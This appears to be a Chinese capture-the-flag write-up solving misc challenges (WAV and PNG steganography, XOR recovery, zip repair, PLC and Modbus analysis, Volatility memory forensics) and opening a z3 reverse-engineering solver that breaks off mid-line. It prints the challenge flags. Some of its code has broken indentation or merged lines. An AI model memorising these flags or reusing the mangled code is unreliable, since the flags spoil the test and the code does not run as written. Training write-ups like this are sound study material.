<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> wave, math, struct</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">obj = wave.<span class="built_in">open</span>(<span class="string">&#x27;data.wav&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">frames = obj.getnframes()</span><br><span class="line">frames_data = obj.readframes(frames).<span class="built_in">hex</span>()</span><br><span class="line">bin_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(frames_data), <span class="number">4</span>):  </span><br><span class="line">	data = frames_data[idx:idx+<span class="number">4</span>]  </span><br><span class="line">	data = data[<span class="number">2</span>:] + data[:<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(data, <span class="number">16</span>) &lt;= <span class="number">20000</span>: </span><br><span class="line">	bin_data += <span class="string">&#x27;0&#x27;</span> </span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">int</span>(data, <span class="number">16</span>) &gt; <span class="number">20000</span> <span class="keyword">and</span> <span class="built_in">int</span>(data, <span class="number">16</span>) &lt;= <span class="number">32000</span>: </span><br><span class="line">	bin_data += <span class="string">&#x27;1&#x27;</span> </span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">int</span>(data, <span class="number">16</span>) &gt; math.<span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">15</span>): </span><br><span class="line">	overflow_data = math.<span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">15</span>) - (<span class="built_in">int</span>(data, <span class="number">16</span>) - math.<span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">15</span>))  </span><br><span class="line"><span class="keyword">if</span> overflow_data &gt; <span class="number">20000</span> <span class="keyword">and</span> overflow_data &lt;= <span class="number">32000</span>: </span><br><span class="line">	bin_data += <span class="string">&#x27;1&#x27;</span> <span class="keyword">elif</span> overflow_data &lt;= <span class="number">20000</span>: </span><br><span class="line">		bin_data += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">		hex_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_data), <span class="number">8</span>): </span><br><span class="line">		hex_data += <span class="string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(bin_data[idx:idx+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f1:    </span><br><span class="line">		f1.write(unhexlify(hex_data))</span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/4a4e4bf39bcff26ae0d78cff44285645.png" alt="img"></p>
<p>到一张PNG图片，从 <code>binwalk</code>分析来看，文件尾附加了内容</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/9f0b175c44daa14f56b73e4932a75a95.png" alt="img"></p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/b7887888f323c7d8be03283404f65413.png" alt="img"></p>
<p>附加内容直接看不出来什么，尝试对图片分析，发现存在无密码的LSB隐写</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/6076aa36c7012cc5679d7f957e99a674.png" alt="img"></p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">hint:</span> <span class="keyword">xor</span> [<span class="number">00</span>-ff] which <span class="keyword">one</span>?</span><br></pre></td></tr></table></figure>

<p>提示异或一个范围内的一个值，即可猜测附加的数据是经过异或的；可以尝试提取开头的几个字节进行异或看看结果是否为常见文件类型的文件头；Python简单处理即可</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">head_bytes = <span class="string">&#x27;F6 2F 31 38&#x27;</span></span><br><span class="line">for n <span class="meta">in</span><span class="meta"> range(</span>0xff): </span><br><span class="line">	hex_data = head_bytes.split(<span class="string">&quot; &quot;</span>) </span><br><span class="line">	xor_data = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">	for data <span class="meta">in</span> hex_data:  </span><br><span class="line"><span class="keyword">		data </span>=<span class="meta"> int(</span>data, 16) ^ n </span><br><span class="line">		xor_data += <span class="string">&#x27; &#123;:02x&#125;&#x27;</span>.<span class="meta">format</span>(data)    </span><br><span class="line">		p<span class="meta">rint(</span><span class="string">&quot;XOR &#123;:02x&#125;: &#123;&#125;&quot;</span>.<span class="meta">format</span>(n, xor_data))</span><br></pre></td></tr></table></figure>

<p>从结果中可以发现出现了PNG文件头</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/3ee0c28be7749f32a079eb771d6c263d.png" alt="img"></p>
<p>将附加数据提取出来，使用 <code>010 Editor</code></p>
<p>打开 <code>工具-&gt;十六进制运算-&gt;二进制异或</code></p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/bad51b2ec76a480e287d745ca6eb6097.png" alt="img"></p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/b3fac5ffcec0f7e470f45096d117aebd.png" alt="img"></p>
<p>二维码，扫描即可得到flag </p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/267a6fc71f6534c17f13739b121e8b1a.png" alt="img"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">BMZCTF</span>&#123;<span class="number">755</span>f<span class="number">3</span>d<span class="number">5</span>c-<span class="number">4817</span>-<span class="number">4610</span>-a<span class="number">377</span>-<span class="number">68743</span>f<span class="number">09</span>e<span class="number">60</span>a&#125;</span><br></pre></td></tr></table></figure>

<h3 id="游戏秘籍"><a href="#游戏秘籍" class="headerlink" title="游戏秘籍"></a>游戏秘籍</h3><p>图片后面接了一个压缩包。但标识位的顺序错了。按504B0304…504B0102….504B0506的顺序调整，即可得到正确的压缩包。</p>
<p>密码：</p>
<p>查看图片IDAT后面的CRC，拼接起来。得到：```</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">The_Hint_is</span>:`U<span class="number">1</span>kkgG:VbDE<span class="number">3</span>[<span class="number">1</span>oy[<span class="number">1</span>Ee`DEy`<span class="number">0</span>ghSzF&gt;&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>后面CRC是乱码，将CRC的16进制拼起来，得到： <code>E4B88AE99DA2E5AD97E7ACA6E4B8B2E5BC82E68896E99BB6E58F89E99BB6E4B889E784B6E5908EE59CA8424153453634E8A7A3E7A081E38082</code> hex转字符串得到： <code>上面字符串异或零叉零三然后在BASE64解码</code>。得到密码： <code>What?That_is_a_passwd?!</code></p>
<p>flag</p>
<p>解压后：是一个文本，用MD阅读软件打开，使用math方法，得到矩阵，并发现有零宽字节隐写。解密后为25*25的矩阵。每行按 <code>上上下下左左右右ABAB</code>的顺序排列就得到正确的矩阵。再按1涂黑，0涂白，得到二维码。扫码即行flag</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">BMZCTF</span>&#123;y<span class="number">0</span>u_f<span class="number">1</span>nd_the_<span class="number">4</span>l@g&#125;</span><br></pre></td></tr></table></figure>

<h3 id="temperature"><a href="#temperature" class="headerlink" title="temperature"></a>temperature</h3><p>根据题目给出的plc梯形图，可以确定温度变送器的量程为0-100℃，裸数据的上、下限为6400-32000，从而确定产品型号为西门子200，后面计算时会用到。</p>
<p>Encrypted.txt为plc采集上来的温度裸数据值的加密值，范围为6400&lt;=加密数据&lt;=32000，先对Encrypted.txt加密数据进行解密。</p>
<ul>
<li>先对数据进行base91解密</li>
</ul>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/f1abb18ca4aecc26258ca8c53228f54f.png" alt="img"></p>
<ul>
<li>再进行base85解密</li>
</ul>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/97ac4f0778e176f16dcf291e2d99f651.png" alt="img"></p>
<ul>
<li>再进行16进制解码 </li>
</ul>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/28b74790ae267248d819810f0f0c1e0f.png" alt="img"></p>
<ul>
<li>解码后为66974超出裸数据最大范围，判断为简单的数字替换编码，进行ROT5解码，最后结果为11429</li>
</ul>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/2f0d987fdde8336b35dc7a00151a7a8c.png" alt="img"></p>
<ul>
<li><p>标准电信号是 A0—Am（如：4—20mA）， A/D 转换后数值为 D0—Dm（如：6400—32000），设模拟量的标准电信号是 A，A/D 转换后的相应数值为 D，由于是线性关系，</p>
<p>函数关系 A＝f（D）可以表示为数学方程：A＝（D－D0）×（Am－A0）／（Dm－D0）＋A0。根据该方程式，可以方便地根据 D 值计算出 A 值。将该方程式逆变换，得出函数关系 D＝f（A）可以表示为数学方程： </p>
<p>D＝（A－A0）×（Dm－D0）／（Am－A0）＋D0 </p>
<p>根据公式D = (温度变送器上限-下限)×（采集数据－裸数据下限）／（电流上限－电流下限）＋温度变送器下限，可直接计算出真实温度值</p>
</li>
</ul>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/1edc760ab14bda6190b746d31814f5ce.jpeg" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">AIW2 = <span class="number">11429</span>  <span class="comment">#解密后的裸数据值</span></span><br><span class="line">D0 = <span class="number">6400</span></span><br><span class="line">DM = <span class="number">32000</span></span><br><span class="line">A0 = <span class="number">4</span></span><br><span class="line">AM = <span class="number">20</span></span><br><span class="line">rangeH = <span class="number">100</span></span><br><span class="line">rangeI = <span class="number">0</span><span class="comment">#量程为0-100℃</span></span><br><span class="line">D = (rangeH-rangeI)*(AIW2-D0)/(DM-D0)+0<span class="built_in">print</span>(<span class="string">&quot;换算后的温度为：&quot;</span>,D)<span class="comment">#精确到3位小数</span></span><br><span class="line"><span class="number">19.64453125</span>--</span><br><span class="line">&gt;&gt;&gt;&gt;<span class="number">19.645</span>D = <span class="number">19.645</span>md_sale = hashlib.md5(<span class="built_in">str</span>(D).encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(md_sale)</span><br></pre></td></tr></table></figure>

<p>根据数模转转换公式最后求得flag为：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">32953271</span>ae<span class="number">52</span>e<span class="number">2</span>a<span class="number">652</span>b<span class="number">4</span>dff<span class="number">491</span>dd<span class="number">6</span>aa<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>1、根据题目要求，操作人员在scada系统上对一台设备进行了远程启动，请数据包信息找出发送的启动信息的数值。</p>
<p>2、一般远程控制大部分用tcp/ip或modbus协议，我们直接过滤modbus协议：找到写命令或是直接用modbus.func_code == 6找到写命令</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/b425f8fba32fe0f58119b840c6398a00.png" alt="img"></p>
<p>0051进行16进制到10进制解码得到81</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/bb374fcbff469dbb2f7e2c569c21785a.png" alt="img"></p>
<p>再对81进行md5得到flag值43ec517d68b6edd3015b3edc9a11367b</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/505b5a31ddc029fd5d4f4cc311cfa6d7.png" alt="img"></p>
<h3 id="hard-misc"><a href="#hard-misc" class="headerlink" title="hard_misc"></a>hard_misc</h3><p>首先下载附件</p>
<p>使用volatility查看内存中的粘贴板发现存在URL</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/ca6b00e454f579de84ef060e4c54b9bf.png" alt="img"></p>
<p>并且在进程中发现了notepad.exe</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/8de23cfa80b08e31c7194f8f2cb15abb.png" alt="img"></p>
<p>dump notepad.exe内存到1380.dmp</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/500bab9865996f9bc70a2d6f9c348de2.png" alt="img"></p>
<p>使用strings命令发现密码password</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">strings</span> <span class="number">1380</span>.dmp| grep -i <span class="string">&quot;password&quot;</span>……</span><br><span class="line"><span class="attribute">AdministratorPasswordPasswordPassword</span>: ****P@ssw<span class="number">0</span>rd<span class="number">4</span>zip****Password(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>打开链接后发现是图片隐写</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/c1b0b62c6552420bbb7f4d3ac1df056f.png" alt="img"></p>
<p>使用Python的Pillow库进行图片解析，发现RGB的值只有R和G是随机值，B为0或255</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/b4003b2b4da763fee656756b7255f7ad.png" alt="img"></p>
<p>提取所有B的值并转换为二进制（255为1时0为0，0为1时255为0）</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/4154858dde11b6512b5c0d3206418b1a.png" alt="img"></p>
<p>可以看到转换后的值存在一定规律，猜测为Manchester Encoding（曼切斯特编码）</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/4c202f0874eb180bfb731add0fef5cf8.png" alt="img"></p>
<p>解码后成功获取到原始二进制数据</p>
<p>转换为ASCII编码后获取到base64编码的字符串</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">UmFyIRoHAQBfZrcbIQQAAAEPfcLH49GPyiSQWUvfPyBHjeg7</span>+R<span class="number">0</span>f<span class="number">0</span>FXFnfecVDfBeSCQ<span class="number">6</span>ey<span class="number">4</span>AO/<span class="number">8</span>o<span class="number">1</span>skWuo/<span class="number">7</span>WfC<span class="number">3</span>f<span class="number">3</span>iB<span class="number">67</span>CTeFvPGysBBX<span class="number">90</span>iGgCVpWB<span class="number">6</span>pNE/yuhoY<span class="number">87</span>FdolPm<span class="number">6</span>gDEKQyQuRu<span class="number">2</span>tmXVyNDsb<span class="number">5</span>GpKb<span class="number">9</span>jb<span class="number">3</span>y<span class="number">4</span>o<span class="number">3</span>kgAX<span class="number">6</span>hiZ+b+awAw/BP<span class="number">36</span>gOD<span class="number">5</span>bZuDHi<span class="number">02</span>rsR+<span class="number">5</span>iWXasXurpI<span class="number">3</span>GOmrWF+pIXDobO<span class="number">1</span>qa<span class="number">3</span>dOi<span class="number">5</span>Exp<span class="number">1</span>Czt<span class="number">2</span>S<span class="number">8</span>BQ+XYqbEDKvh<span class="number">6</span>goVLaENeiHq<span class="number">4</span>rx<span class="number">6</span>EF/j<span class="number">5</span>r<span class="number">8</span>/+gC<span class="number">9</span>u<span class="number">9</span>n+<span class="number">848</span>lgCvHYcNH<span class="number">34</span>A/PcIUGXS<span class="number">6</span>LnmIAFu<span class="number">67</span>zQKuHkIWq<span class="number">1</span>nIVognt/oDpfPUrLe<span class="number">8</span>VfdIj<span class="number">17</span>m<span class="number">1</span>BjxvkmsHn<span class="number">9</span>uwlGoivc<span class="number">8</span>c<span class="number">6</span>iv<span class="number">0</span>j<span class="number">46</span>pRDKrzmLmYowfwmll/L<span class="number">7</span>l/g/Y<span class="number">1</span>snSjjVhXvR<span class="number">8</span>oCzDO<span class="number">8</span>EjnNqiwXerarLfHDq+<span class="number">6</span>FMZW<span class="number">2</span>M<span class="number">3</span>/<span class="number">3</span>VRe<span class="number">3</span>a<span class="number">8</span>=</span><br></pre></td></tr></table></figure>

<p>解码后通过文件头发现该文件格式为RAR</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/25e5215d13f19c88de3caa996bdd7f74.png" alt="img"></p>
<p>使用notepad获取到的密码进行解密</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/68c3cb7602fbea1e41d2bcfbba3ce550.png" alt="img"></p>
<p>打开文件即可获取flag，flag{2ac505ffb2c5deab71d242ec4af148c9}</p>
<hr>
<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h3><p>32位程序，主要流程在LPL中</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/ea6bd1f49da099120945aeebe82f5237.png" alt="img"></p>
<p>直接z3</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/b25ba0f52b231ddd6739f838663e25e9.jpeg" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">P=[<span class="number">12864</span>,<span class="number">5522</span>,<span class="number">10710</span>,<span class="number">6924</span>,<span class="number">788</span>,<span class="number">10715</span>,<span class="number">10008</span>,<span class="number">13022</span>,<span class="number">15893</span>,<span class="number">9754</span>,<span class="number">7946</span>,<span class="number">7490</span>,<span class="number">5636</span>,<span class="number">13477</span>, <span class="number">2198</span>,<span class="number">5861</span>,<span class="number">5799</span>,<span class="number">5259</span>,<span class="number">6464</span>,<span class="number">6171</span>,<span class="number">2269</span>,<span class="number">9251</span>,<span class="number">8315</span>,<span class="number">2989</span>,-<span class="number">199</span>,<span class="number">2680</span>]</span><br><span class="line">a = [z3.BitVec(<span class="string">&quot;p%d&quot;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>)]   </span><br><span class="line">f=<span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line">s=Solver()</span><br><span class="line">s.add(a[<span class="number">0</span>]==<span class="built_in">ord</span>(f[<span class="number">0</span>]))</span><br><span class="line">s.add(a[<span class="number">1</span>]==<span class="built_in">ord</span>(f[<span class="number">1</span>]))</span><br><span class="line">s.add(a[<span class="number">2</span>]==<span class="built_in">ord</span>(f[<span class="number">2</span>]))</span><br><span class="line">s.add(a[<span class="number">3</span>]==<span class="built_in">ord</span>(f[<span class="number">3</span>]))</span><br><span class="line">s.add(a[<span class="number">4</span>]==<span class="built_in">ord</span>(f[<span class="number">4</span>]))</span><br><span class="line">s.add(P[<span class="number">0</span>]==<span class="number">12</span>*a[<span class="number">5</span>]+<span class="number">44</span>*a[<span class="number">7</span>]+<span class="number">17</span>*a[<span class="number">6</span>]+<span class="number">100</span>*a[<span class="number">8</span>]+<span class="number">20</span>*a[<span class="number">9</span>]+<span class="number">75</span>*a[<span class="number">10</span>])</span><br><span class="line">s.add(P[<span class="number">1</span>]==<span class="number">63</span>*a[<span class="number">10</span>]+<span class="number">58</span>*a[<span class="number">9</span>]+<span class="number">46</span>*a[<span class="number">5</span>]+<span class="number">25</span>*a[<span class="number">8</span>]-<span class="number">89</span>*a[<span class="number">7</span>]+<span class="number">12</span>*a[<span class="number">6</span>]+<span class="number">2</span>)</span><br><span class="line">s.add(P[<span class="number">2</span>]==<span class="number">23</span>*a[<span class="number">8</span>]+<span class="number">45</span>*a[<span class="number">9</span>]+<span class="number">26</span>*a[<span class="number">5</span>]+<span class="number">77</span>*a[<span class="number">6</span>]+<span class="number">11</span>*a[<span class="number">10</span>]+<span class="number">41</span>*a[<span class="number">7</span>]+<span class="number">6</span>)</span><br><span class="line">s.add(P[<span class="number">3</span>]==<span class="number">34</span>*a[<span class="number">7</span>]+<span class="number">12</span>*a[<span class="number">8</span>]+<span class="number">15</span>*a[<span class="number">10</span>]+<span class="number">19</span>*a[<span class="number">9</span>]+<span class="number">20</span>*a[<span class="number">6</span>]+<span class="number">44</span>*a[<span class="number">5</span>]+<span class="number">12</span>)</span><br><span class="line">s.add(P[<span class="number">4</span>]==<span class="number">4</span>*a[<span class="number">9</span>]+<span class="number">2</span>*a[<span class="number">10</span>]+<span class="number">5</span>*a[<span class="number">7</span>]-<span class="number">4</span>*a[<span class="number">8</span>]+<span class="number">8</span>*a[<span class="number">6</span>]+a[<span class="number">5</span>]+<span class="number">20</span>)</span><br><span class="line">s.add(P[<span class="number">5</span>]==<span class="number">12</span>*a[<span class="number">6</span>]+<span class="number">10</span>*a[<span class="number">7</span>]+<span class="number">9</span>*a[<span class="number">9</span>]+<span class="number">8</span>*a[<span class="number">8</span>]+<span class="number">99</span>*a[<span class="number">10</span>]+<span class="number">85</span>*a[<span class="number">5</span>]+<span class="number">11</span>)</span><br><span class="line">s.add(P[<span class="number">6</span>]==<span class="number">11</span>*a[<span class="number">11</span>]+<span class="number">12</span>*a[<span class="number">12</span>]+<span class="number">33</span>*a[<span class="number">13</span>]+<span class="number">55</span>*a[<span class="number">14</span>]+<span class="number">77</span>*a[<span class="number">15</span>]+<span class="number">20</span>*a[<span class="number">16</span>]+<span class="number">24</span>)</span><br><span class="line">s.add(P[<span class="number">7</span>]==<span class="number">66</span>*a[<span class="number">11</span>]+<span class="number">45</span>*a[<span class="number">13</span>]+<span class="number">78</span>*a[<span class="number">15</span>]+<span class="number">21</span>*a[<span class="number">14</span>]+<span class="number">56</span>*a[<span class="number">12</span>]+<span class="number">3</span>*a[<span class="number">16</span>]+<span class="number">110</span>)</span><br><span class="line">s.add(P[<span class="number">8</span>]==<span class="number">65</span>*a[<span class="number">12</span>]+<span class="number">25</span>*a[<span class="number">15</span>]+<span class="number">78</span>*a[<span class="number">16</span>]+<span class="number">54</span>*a[<span class="number">14</span>]+<span class="number">96</span>*a[<span class="number">11</span>]+a[<span class="number">13</span>]*<span class="number">13</span>+<span class="number">5</span>)</span><br><span class="line">s.add(P[<span class="number">9</span>]==<span class="number">88</span>*a[<span class="number">13</span>]+<span class="number">20</span>*a[<span class="number">14</span>]+a[<span class="number">15</span>]*<span class="number">7</span>+a[<span class="number">16</span>]*<span class="number">36</span>+a[<span class="number">11</span>]*<span class="number">11</span>+a[<span class="number">12</span>]*<span class="number">41</span>+<span class="number">10</span>)</span><br><span class="line">s.add(P[<span class="number">10</span>]==a[<span class="number">14</span>]*<span class="number">14</span>+a[<span class="number">15</span>]*<span class="number">55</span>+a[<span class="number">16</span>]*<span class="number">62</span>+a[<span class="number">11</span>]*<span class="number">17</span>+a[<span class="number">12</span>]*<span class="number">8</span>+a[<span class="number">13</span>]+<span class="number">410</span>)</span><br><span class="line">s.add(P[<span class="number">11</span>]==a[<span class="number">15</span>]*<span class="number">52</span>+a[<span class="number">16</span>]+a[<span class="number">11</span>]+a[<span class="number">12</span>]*<span class="number">2</span>+a[<span class="number">14</span>]*<span class="number">5</span>+a[<span class="number">13</span>]*<span class="number">6</span>+a[<span class="number">14</span>]*<span class="number">88</span>+<span class="number">50</span>)</span><br><span class="line">s.add(P[<span class="number">12</span>]==a[<span class="number">17</span>]+a[<span class="number">18</span>]+<span class="number">8</span>*a[<span class="number">19</span>]+<span class="number">9</span>*a[<span class="number">20</span>]+<span class="number">11</span>*a[<span class="number">21</span>]+<span class="number">85</span>*a[<span class="number">22</span>]+<span class="number">11</span>)</span><br><span class="line">s.add(P[<span class="number">13</span>]==a[<span class="number">18</span>]*<span class="number">56</span>+a[<span class="number">19</span>]*<span class="number">65</span>+a[<span class="number">20</span>]*<span class="number">78</span>+a[<span class="number">21</span>]*<span class="number">22</span>+a[<span class="number">22</span>]*<span class="number">55</span>+a[<span class="number">17</span>]+<span class="number">26</span>)</span><br><span class="line">s.add(P[<span class="number">14</span>]==a[<span class="number">19</span>]*<span class="number">19</span>+a[<span class="number">20</span>]*<span class="number">3</span>-a[<span class="number">21</span>]-a[<span class="number">22</span>]+a[<span class="number">17</span>]*<span class="number">6</span>+a[<span class="number">18</span>]*<span class="number">20</span>-<span class="number">11</span>)</span><br><span class="line">s.add(P[<span class="number">15</span>]==a[<span class="number">20</span>]*<span class="number">8</span>+a[<span class="number">21</span>]*<span class="number">77</span>+a[<span class="number">22</span>]*<span class="number">46</span>+a[<span class="number">17</span>]*<span class="number">4</span>-a[<span class="number">18</span>]*<span class="number">10</span>-a[<span class="number">19</span>]*<span class="number">5</span>-<span class="number">30</span>)</span><br><span class="line">s.add(P[<span class="number">16</span>]==a[<span class="number">21</span>]*<span class="number">21</span>+a[<span class="number">22</span>]*<span class="number">22</span>+a[<span class="number">17</span>]*<span class="number">17</span>+a[<span class="number">18</span>]*<span class="number">18</span>+a[<span class="number">19</span>]*<span class="number">19</span>+a[<span class="number">20</span>]*<span class="number">20</span>+<span class="number">120</span>)</span><br><span class="line">s.add(P[<span class="number">17</span>]==a[<span class="number">22</span>]*<span class="number">9</span>+a[<span class="number">21</span>]*<span class="number">85</span>+a[<span class="number">20</span>]*<span class="number">5</span>+a[<span class="number">19</span>]*<span class="number">9</span>+a[<span class="number">18</span>]*<span class="number">8</span>+a[<span class="number">17</span>]*<span class="number">4</span>-<span class="number">600</span>)</span><br><span class="line">s.add(P[<span class="number">18</span>]==a[<span class="number">23</span>]*<span class="number">5</span>+a[<span class="number">24</span>]*<span class="number">6</span>+a[<span class="number">25</span>]*<span class="number">7</span>+a[<span class="number">26</span>]*<span class="number">8</span>+a[<span class="number">27</span>]*<span class="number">88</span>+a[<span class="number">28</span>]*<span class="number">22</span>-<span class="number">200</span>)</span><br><span class="line">s.add(P[<span class="number">19</span>]==a[<span class="number">24</span>]*<span class="number">50</span>+a[<span class="number">25</span>]*<span class="number">80</span>+a[<span class="number">26</span>]*<span class="number">10</span>+a[<span class="number">27</span>]*<span class="number">7</span>+a[<span class="number">28</span>]*<span class="number">12</span>-a[<span class="number">23</span>]*<span class="number">20</span>-<span class="number">640</span>)</span><br><span class="line">s.add(P[<span class="number">20</span>]==a[<span class="number">25</span>]*<span class="number">14</span>+a[<span class="number">26</span>]*<span class="number">8</span>+a[<span class="number">27</span>]*<span class="number">4</span>+a[<span class="number">28</span>]*<span class="number">25</span>+a[<span class="number">23</span>]*<span class="number">3</span>+a[<span class="number">24</span>]*<span class="number">7</span>-<span class="number">720</span>)</span><br><span class="line">s.add(P[<span class="number">21</span>]==a[<span class="number">26</span>]*<span class="number">8</span>+a[<span class="number">27</span>]*<span class="number">80</span>+a[<span class="number">28</span>]*<span class="number">40</span>+a[<span class="number">23</span>]*<span class="number">6</span>+a[<span class="number">24</span>]*<span class="number">5</span>+a[<span class="number">25</span>]*<span class="number">60</span>-<span class="number">500</span>)</span><br><span class="line">s.add(P[<span class="number">22</span>]==a[<span class="number">27</span>]*<span class="number">10</span>+a[<span class="number">28</span>]*<span class="number">85</span>+a[<span class="number">23</span>]*<span class="number">40</span>+a[<span class="number">24</span>]*<span class="number">41</span>+a[<span class="number">25</span>]*<span class="number">25</span>-a[<span class="number">26</span>]*<span class="number">26</span>-<span class="number">260</span>)</span><br><span class="line">s.add(P[<span class="number">23</span>]==a[<span class="number">28</span>]*<span class="number">9</span>+a[<span class="number">23</span>]*<span class="number">9</span>+a[<span class="number">24</span>]*<span class="number">55</span>-a[<span class="number">25</span>]*<span class="number">10</span>-a[<span class="number">26</span>]-a[<span class="number">27</span>])</span><br><span class="line">s.add(P[<span class="number">24</span>]==a[<span class="number">29</span>]+a[<span class="number">30</span>]+a[<span class="number">20</span>]-a[<span class="number">19</span>]-a[<span class="number">18</span>]*<span class="number">2</span>+a[<span class="number">16</span>]-<span class="number">250</span>)</span><br><span class="line">s.add(P[<span class="number">25</span>]==a[<span class="number">30</span>]-a[<span class="number">29</span>]+<span class="number">3</span>*a[<span class="number">16</span>]+<span class="number">4</span>*a[<span class="number">5</span>]+<span class="number">55</span>*a[<span class="number">27</span>]+a[<span 